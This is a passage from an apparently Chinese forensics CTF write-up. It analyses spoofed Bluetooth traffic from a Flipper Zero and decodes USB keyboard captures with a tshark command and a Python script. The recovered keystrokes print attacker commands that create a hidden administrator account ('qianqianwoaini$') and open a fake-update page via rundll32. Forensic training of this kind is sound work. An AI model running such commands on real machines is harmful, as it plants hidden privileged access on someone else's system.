class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">✅ 提取的设备名称列表：</span><br><span class="line">&amp;</span><br><span class="line">&amp;�k�)\u0001�@\b̋�|&#125;M���\u001d</span><br><span class="line">4</span><br><span class="line">5Ư��#�=�\u001c%J���Ț��I\u001c�IFG�\</span><br><span class="line">:</span><br><span class="line">:�</span><br><span class="line">B\u0016�</span><br><span class="line">Cracked</span><br><span class="line">Fli0�\u0006��N�G��`</span><br><span class="line">Flipper 123all</span><br><span class="line">Flipper$123all</span><br><span class="line">Flippe��+Fta�d</span><br><span class="line">L</span><br><span class="line">LA-�A�� qC�5 Iu</span><br><span class="line">LE-QqNG QC75 II</span><br><span class="line">LE-YANG QC35 II</span><br><span class="line">LE-YANG QC3�\u0007\u0003\f</span><br><span class="line">LE-YANG QS35 II</span><br><span class="line">LE-YANG`QC\u00135 Ei</span><br><span class="line">LE-YM.G QC35 II</span><br><span class="line">LE-_ANG QC35 II</span><br><span class="line">Nlipper 123al</span><br><span class="line">PE-YQ\u000eG\</span><br><span class="line">QQG�~ïB�OON</span><br><span class="line">QQWWF_SP8LON</span><br><span class="line">QQ_WF+�y�/��</span><br><span class="line">QQ_WF_SP8OM~</span><br><span class="line">QQ_WF_SP8OOF</span><br><span class="line">QQ_WF_SP8OON</span><br><span class="line">QQ_WF_SP8O_�</span><br><span class="line">QQ_WF_SP8OoH</span><br><span class="line">QQ_WF_SP8O�O</span><br><span class="line">QQ_WF_SP8\u000foh</span><br><span class="line">QQ_WF_SP8_Gh</span><br><span class="line">QQ_WF_SP8~�h</span><br><span class="line">QQ_WF_SP8�s&#123;</span><br><span class="line">QQ_WF_SP:W�\u0004</span><br><span class="line">QQ_WF_SP&gt;��X</span><br><span class="line">QQ_WF_SPE�&lt;�</span><br><span class="line">QQ_WF_SP�N\r�</span><br><span class="line">QQ_WF_SP�\b�)</span><br><span class="line">QQ_WF_S�F\</span><br><span class="line">QQ_WF_�V�\u0002W </span><br><span class="line">QQ_WF_�V��ma</span><br><span class="line">QQ_WF_�gXN�h</span><br><span class="line">QQ_WF_�j/�d</span><br><span class="line">QQ_WF�\u001fP:oIB</span><br><span class="line">QQ_WV?%�^N�|</span><br><span class="line">QQ_Wf_SP8OON</span><br><span class="line">QQ_W���\u0003hN�O</span><br><span class="line">QQ_\u0017^��-yN�N</span><br><span class="line">QQ_\u0017����Q)�u</span><br><span class="line">QQg�6��?��\u0006�</span><br><span class="line">QQoOJ^\u000bF8OON</span><br><span class="line">QU\u001fVo�P8O�H</span><br><span class="line">Q�l�Q��\u00028OON</span><br><span class="line">RAP</span><br><span class="line">RAPOO 5.0MS</span><br><span class="line">\f</span><br><span class="line">\u0006</span><br><span class="line">\u0006\u0019</span><br><span class="line">\u0006\u0019\u0012</span><br><span class="line">\u0006\u0019\u0016w�\u00017���N��(�</span><br><span class="line">\u0006\u001a</span><br><span class="line">\u0006\u001b</span><br><span class="line">\u0007</span><br><span class="line">\u000e|.</span><br><span class="line">\u0013��\u001c\u0017�+X</span><br><span class="line">\u0013��\u001c\u0017�\u001bX</span><br><span class="line">\u0013��\u001c\u0017�\u001bX\u0016\b</span><br><span class="line">\u0016</span><br><span class="line">\u0018</span><br><span class="line">\u0018Ȃ�p�I</span><br><span class="line">\u0019�8?���p�\n��h�w��~?��6#&amp;�Ǥr�\u0016s^:\nGy\u0006-)�nO\u0011����l�B��+`��</span><br><span class="line">\u001a</span><br><span class="line">\u001b</span><br><span class="line">w</span><br><span class="line">�</span><br><span class="line">�APOO 5.0</span><br><span class="line">�L�</span><br><span class="line">�\u001b</span><br><span class="line">��� &lt;�ϴ�\u001a��+</span><br></pre></td></tr></table></figure><p>然后我们筛选一下，去除掉QC35 II耳机和RAPOO键盘还有一些乱码的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QQ_Wf_SP8OON</span><br><span class="line">Cracked</span><br><span class="line">Flipper 123all</span><br><span class="line">Nlipper 123al</span><br><span class="line">QQWWF_SP8LON</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428091238258.png" alt="image-20250428091238258"></p><p>发现Flipper Zero是一款可以伪装别人蓝牙设备的黑客玩具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flipper 123all</span><br></pre></td></tr></table></figure><h3 id="T67"><a href="#T67" class="headerlink" title="T67"></a>T67</h3><blockquote><p>起早王有一个用于伪装成倩倩耳机的蓝牙设备，该设备修改成耳机前后的大写MAC地址分别为多少（格式：32位小写md5(原MAC地址_修改后的MAC地址) ，例如md5(11:22:33:44:55:66_77:88:99:AA:BB:CC)&#x3D;a29ca3983de0bdd739c97d1ce072a392 ）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428091603680.png" alt="image-20250428091603680"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前：80:e1:26:33:32:31</span><br></pre></td></tr></table></figure><p>由于Flipper在伪装他人蓝牙设备时会先修改名字再修改MAC地址，所以我们可以通过检索MAC地址相似但名字不同的蓝牙设备来判断。</p><p>直接遍历QQ_WF_SP8OON所有的MAC地址即可，可以找出分别为80:e1:26:33:32:31和52:00:52:10:13:14</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428093001906.png" alt="image-20250428093001906"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后：52:00:52:10:13:14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80:e1:26:33:32:31_52:00:52:10:13:14</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428093152852.png" alt="image-20250428093152852"></p><h3 id="T68"><a href="#T68" class="headerlink" title="T68"></a>T68</h3><blockquote><p>流量包中首次捕获到该伪装设备修改自身名称的UTC+0时间为？（格式：2024&#x2F;03&#x2F;07 01:02:03.123）</p></blockquote><p>搜索一下第一次出现<code>QQ_WF_SP8OON</code>的时间</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428093326760.png" alt="image-20250428093326760"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apr  9, 2025 10:31:26.710747000 中国标准时间</span><br></pre></td></tr></table></figure><p>然后我们将其转换成UTC+0时间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apr 9, 2025 02:31:26.710747000 UTC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/04/09 02:31:26.710</span><br></pre></td></tr></table></figure><h3 id="T69"><a href="#T69" class="headerlink" title="T69"></a>T69</h3><blockquote><p>起早王中途还不断尝试使用自己的手机向倩倩电脑进行广播发包，请你找出起早王手机蓝牙的制造商数据（格式：0x0102030405060708）</p></blockquote><p>还有一个蓝牙设备叫<code>Cracked</code>。</p><p>其中 Manufacturer Specific 中 Data ，字段就是制造⼚商数据。</p><p><a href="https://help.aliyun.com/document_detail/173315.html">https://help.aliyun.com/document_detail/173315.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428094619609.png" alt="image-20250428094619609"></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428094640268.png" alt="image-20250428094640268"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0701434839313430</span><br></pre></td></tr></table></figure><h3 id="T70"><a href="#T70" class="headerlink" title="T70"></a>T70</h3><blockquote><p>起早王的真名是什么（格式：Cai_Xu_Kun 每个首字母均需大写 ）]</p></blockquote><p>这道题不用写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wang_Qi_Zhao</span><br></pre></td></tr></table></figure><p>话虽如此，还是写一下吧。键盘流量的题目，直接用github的项目即可。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428095309113.png" alt="image-20250428095309113"></p><p>wang qi zhao一眼顶针。</p><h3 id="T71"><a href="#T71" class="headerlink" title="T71"></a>T71</h3><blockquote><p>起早王对倩倩的电脑执行了几条cmd里的命令（格式：1 ）</p></blockquote><p>一眼七条</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><h3 id="T72"><a href="#T72" class="headerlink" title="T72"></a>T72</h3><blockquote><p>倩倩电脑中影子账户的账户名和密码为什么（格式：32位小写md5(账号名称_密码) ，例如md5(zhangsan_123456)&#x3D;9dcaac0e4787b213fed42e5d78affc75 ）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428102052174.png" alt="image-20250428102052174"></p><p>这里应该是脚本的识别能力不太行，没有识别出shift。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qianqianwoaini$_abcdefghijkImn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53af9cd5e53e237020bea0932a1cbdaa</span><br></pre></td></tr></table></figure><p>这里给出一个键盘分析的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r B:\USBPcap -T json &gt; C:\Users\TY\Desktop\keyboard.json</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define normal key mappings</span></span><br><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">    <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;`&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define Shift key mappings</span></span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">    <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>,</span><br><span class="line">    <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;34&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_usbhid_data</span>(<span class="params">json_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(json_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment"># Fix: Specify UTF-8 encoding</span></span><br><span class="line">            data = json.load(file)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># Fallback to &#x27;utf-8-sig&#x27; if the file has a BOM (Byte Order Mark)</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(json_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-16&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = json.load(file)</span><br><span class="line"></span><br><span class="line">    result_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> data:</span><br><span class="line">        layers = packet[<span class="string">&#x27;_source&#x27;</span>][<span class="string">&#x27;layers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;usbhid.data&#x27;</span> <span class="keyword">in</span> layers:</span><br><span class="line">            usbhid_data = layers[<span class="string">&#x27;usbhid.data&#x27;</span>].split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            second_byte = usbhid_data[<span class="number">1</span>]  <span class="comment"># Check if Shift is pressed</span></span><br><span class="line">            key_map = shiftKeys <span class="keyword">if</span> second_byte != <span class="string">&quot;00&quot;</span> <span class="keyword">else</span> normalKeys</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> byte_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(usbhid_data)):</span><br><span class="line">                key_code = usbhid_data[byte_index]</span><br><span class="line">                <span class="keyword">if</span> key_code == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># Skip empty keys</span></span><br><span class="line">                key_char = key_map.get(key_code, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                result_string += key_char</span><br><span class="line">    <span class="keyword">return</span> result_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    extracted_string = extract_usbhid_data(<span class="string">r&#x27;c:\Users\TY\Desktop\keyboard.json&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Extracted String:&quot;</span>, extracted_string)</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Extracted String: m]&lt;F6&gt;[2m[m33[]3333mmmbao&lt;SPACE&gt;bao,zui&lt;SPACE&gt;jin&lt;SPACE&gt;you&lt;SPACE&gt;ge&lt;SPACE&gt;nan&lt;SPACE&gt;sheng&lt;SPACE&gt;xiang&lt;SPACE&gt;zhui&lt;SPACE&gt;wo,ta&lt;SPACE&gt;jiaaoo&lt;SPACE&gt;wwaang&lt;SPACE&gt;qi&lt;SPACE&gt;zhao&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;qi&lt;SPACE&gt;zao&lt;SPACE&gt;wang&lt;SPACE&gt;ta&lt;SPACE&gt;shuo&lt;SPACE&gt;ta&lt;SPACE&gt;ai&lt;SPACE&gt;wo,dan&lt;SPACE&gt;shi&lt;SPACE&gt;cong&lt;SPACE&gt;bu&lt;SPACE&gt;baanng&lt;SPACE&gt;wo&lt;SPACE&gt;na&lt;SPACE&gt;kuai&lt;SPACE&gt;di,hao&lt;SPACE&gt;fan&lt;SPACE&gt;aRcmd&lt;RET&gt;L]bdfgghiiklnnoomljji]i&lt;F7&gt;h]i]i3j]k3lmlmkmhigmgfmemedmbcaaabbb[22[&lt;F6&gt;[&lt;F6&gt;[2222[2[2[&lt;F6&gt;[2llllllllm2m[][3&lt;F6&gt;[mm2mmmmmm]abcedeemdme]eefeggif3fcbba]3mmaccmcmf3f]h]g3f]e3d3c]c3b]b]]3mmmmm[[&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;[l2llabeeegffdca&lt;SPACE&gt;whoami&lt;RET&gt;net&lt;SPACE&gt;user&lt;RET&gt;net&lt;SPACE&gt;user&lt;SPACE&gt;qianqianwoaini$&lt;SPACE&gt;abcdefghijk&lt;CAP&gt;i&lt;CAP&gt;mn&lt;SPACE&gt;/add&lt;RET&gt;net&lt;SPACE&gt;localgroup&lt;SPACE&gt;administrators&lt;SPACE&gt;qianqianwoaini$&lt;SPACE&gt;/add&lt;RET&gt;net&lt;SPACE&gt;user&lt;SPACE&gt;qianqianwoaini$&lt;SPACE&gt;/del[ll22&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;[[[22lmll222l2llllllllcgikllmmlljjhhhfecb&lt;F7&gt;&lt;F7&gt;]]&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;[22[2[[[[&lt;F6&gt;[&lt;F6&gt;&lt;F6&gt;&lt;F6&gt;[&lt;F6&gt;[[2[22lmlm&lt;RET&gt;net&lt;SPACE&gt;localgroup&lt;SPACE&gt;administrators&lt;SPACE&gt;qianqianwoaini$&lt;SPACE&gt;/add&lt;RET&gt;rundll32&lt;SPACE&gt;url.dll,&lt;CAP&gt;f&lt;CAP&gt;ile&lt;CAP&gt;p&lt;CAP&gt;rotocol&lt;CAP&gt;h&lt;CAP&gt;andler&lt;SPACE&gt;https://fakeupdate.net/win10ue/bsod.htmlgmjmk3gecmcmaa3mmmamm&lt;RET&gt;ceghkm&lt;F7&gt;m&lt;F7&gt;n&lt;F7&gt;n&lt;F7&gt;l&lt;F7&gt;l]j&lt;F7&gt;h]fdb&lt;F7&gt;&lt;F7&gt;lllllllll</span><br></pre></td></tr></table></figure><p>发现确实是之前的脚本识别错误了。</p><h3 id="T73"><a href="#T73" class="headerlink" title="T73"></a>T73</h3><blockquote><p>起早王对倩倩的电脑执行的最后一条命令是什么（格式：32位小写md5(完整命令)，例如md5(echo “qianqianwoaini” &gt; 